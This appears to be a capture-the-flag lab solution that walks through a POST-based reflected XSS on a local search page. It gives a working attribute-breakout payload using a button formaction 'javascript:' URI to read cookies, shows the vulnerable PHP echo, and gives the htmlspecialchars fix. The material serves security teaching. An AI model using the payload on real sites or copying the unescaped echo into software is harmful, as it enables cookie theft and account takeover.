# Formaction XSS Lab - Complete Solution

## 🎯 Objective
Extract the flag from the `xss_flag` cookie and display it in an alert dialog.

---

## 🔍 Step-by-Step Solution

### Step 1: Explore the Application

1. Visit `http://localhost:8018/`
2. You'll see a product search page
3. Enter any text (e.g., "test") and click Search
4. Observe that your input is displayed back on the page

### Step 2: Identify the Injection Point

Right-click and "View Page Source" or inspect the element:

```html
<input
    type="text"
    value="test"
    readonly
    style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;"
>
```

**Key Observation:**
- Your input (`test`) is inside the `value` attribute
- There's no HTML encoding being applied
- This is an **attribute injection** point

### Step 3: Understand the Attack Surface

**POST vs GET:**
- This form uses `method="POST"`
- Traditional reflected XSS often uses GET
- POST-based XSS requires form submission

**Attribute Context:**
To inject HTML, you need to:
1. Escape the `value` attribute with `"`
2. Close the `<input>` tag with `>`
3. Inject your own HTML

### Step 4: Research HTML5 Formaction

The `formaction` attribute (HTML5):
- Can be used on `<button>` and `<input>` elements
- Overrides the form's `action` attribute
- Accepts `javascript:` URIs

Example:
```html
<button formaction="javascript:alert('XSS')">Click me</button>
```

### Step 5: Craft the Payload

**Building the payload step by step:**

Starting point (where your input goes):
```html
<input value="**YOUR_INPUT_HERE**" readonly>
```

Step 1 - Escape the attribute:
```html
<input value=""**YOUR_INPUT_HERE**" readonly>
```

Step 2 - Close the input tag:
```html
<input value="">**YOUR_INPUT_HERE**" readonly>
```

Step 3 - Inject a button with formaction:
```html
<input value=""><button formaction="javascript:alert(document.cookie)">Click me
```

**Final Payload:**
```html
"><button formaction="javascript:alert(document.cookie)">Click for Flag!
```

### Step 6: Execute the Exploit

1. **Enter the payload** in the search box:
   ```
   "><button formaction="javascript:alert(document.cookie)">Click for Flag!
   ```

2. **Click "Search"** button

3. **Observe the result:**
   - A new button appears on the page
   - The button text says "Click for Flag!"

4. **Click the injected button**

5. **An alert appears** showing all cookies:
   ```
   xss_flag=FLAG{formaction_xss_master_a1b2c3d4e5f6g7h8}
   ```

### Step 7: Extract the Flag

From the alert dialog, copy the flag:
```
FLAG{formaction_xss_master_a1b2c3d4e5f6g7h8}
```

**Note:** Your flag will have different random characters at the end.

---

## 🎓 What You Learned

1. **POST-based XSS** - XSS can occur in POST requests, not just GET
2. **Attribute Injection** - Breaking out of HTML attributes to inject code
3. **HTML5 Formaction** - Using `formaction` attribute for XSS
4. **Cookie Theft** - Using XSS to extract sensitive cookie data
5. **User Interaction** - Some XSS payloads require user interaction (clicking)

---

## 🔐 Prevention

**Vulnerable Code:**
```php
<input type="text" value="<?php echo $_POST['search']; ?>" readonly>
```

**Secure Code:**
```php
<input type="text" value="<?php echo htmlspecialchars($_POST['search'], ENT_QUOTES, 'UTF-8'); ?>" readonly>
```

**Security Measures:**
1. **Output Encoding** - Use `htmlspecialchars()` with `ENT_QUOTES`
2. **Content Security Policy** - Implement CSP headers
3. **Input Validation** - Validate and sanitize user input
4. **HttpOnly Cookies** - Mark sensitive cookies as HttpOnly
5. **SameSite Cookies** - Use SameSite attribute for cookies

---

## 📊 Comparison with Other XSS Types

| Feature | Script Tag XSS | This Lab (Formaction) |
|---------|---------------|----------------------|
| HTTP Method | Usually GET | POST |
| Injection Point | Direct HTML | Attribute context |
| Payload | `<script>alert(1)</script>` | `"><button formaction="javascript:...">` |
| Auto-execute | Yes | Requires click |
| Detection | Easy | Moderate |

---

## ✅ Checklist

- [x] Identified POST-based vulnerability
- [x] Found attribute injection point
- [x] Escaped attribute context
- [x] Crafted formaction payload
- [x] Executed JavaScript via injected button
- [x] Extracted cookie with flag
- [x] Understood prevention methods

---

## 🚀 Next Steps

Now that you've mastered this Easy-level lab, try:

1. **DOM XSS Lab** (Port 8012) - Medium difficulty
2. **DOM innerHTML XSS Lab** (Port 8013) - Medium difficulty
3. **JS Context XSS Lab** (Port 8016) - Hard difficulty

---

## 📚 Additional Resources

- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: formaction attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/button#attr-formaction)
- [PortSwigger: XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
